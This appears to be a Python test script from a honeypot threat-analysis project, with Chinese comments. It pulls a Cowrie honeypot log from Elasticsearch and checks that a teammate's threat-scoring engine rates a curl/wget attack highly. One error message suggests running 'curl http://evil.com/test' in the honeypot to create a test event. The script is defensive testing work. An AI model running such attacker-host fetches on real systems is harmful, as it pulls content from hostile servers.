import sys
import json
sys.path.append('/root/TraceX')

try:
    from collector.common.es_client import ESClient
    from collector.common.schema import UnifiedEvent
    # 引用组员 3 的评分引擎
    from analyzer.attack_analyzer.context_engine import ContextEngine
except ImportError as e:
    print(f"❌ 模块导入失败: {e}")
    sys.exit(1)

def test_step1():
    print("========== [Step 1] 测试组员 3 ContextEngine ==========")
    es = ESClient()
    engine = ContextEngine()

    # 1. 从 ES 抓取一条你制造的 wget/curl 攻击日志
    # 这里利用你在 Cowrie 解析器里定义的 dataset="cowrie"
    query = {
        "query": {
            "bool": {
                "must": [
                    {"term": {"event.dataset": "cowrie"}},
                    {"term": {"event.severity": 8}} # 找严重级为 8 的 (curl/wget)
                ]
            }
        },
        "size": 1,
        "sort": [{"@timestamp": "desc"}]
    }

    hits = es.es.search(index="honeypot-logs-*", body=query)['hits']['hits']
    
    if not hits:
        print("❌ 没找到高危日志，请先去蜜罐执行 'curl http://evil.com/test'")
        return

    raw_event = hits[0]['_source']
    event = UnifiedEvent.from_dict(raw_event)
    
    print(f"[*] 获取测试事件: {event.process.command_line}")
    print(f"[*] 原始置信度 (Detection): {event.detection.confidence}")

    # 2. 调用组员 3 的核心评分函数 evaluate_threat
    try:
        result = engine.evaluate_threat(event)
        print("\n📊 组员 3 评分结果:")
        print(json.dumps(result, indent=2, ensure_ascii=False))
        
        # 验证标准：分数必须很高，因为你的置信度是 1.0
        if result.get('score', 0) >= 80:
            print("✅ [通过] 评分引擎逻辑正常！")
        else:
            print("⚠️ [警告] 评分偏低，组员 3 可能没用上 confidence 字段。")
            
    except Exception as e:
        print(f"❌ 组员 3 代码崩溃: {e}")

if __name__ == "__main__":
    test_step1()
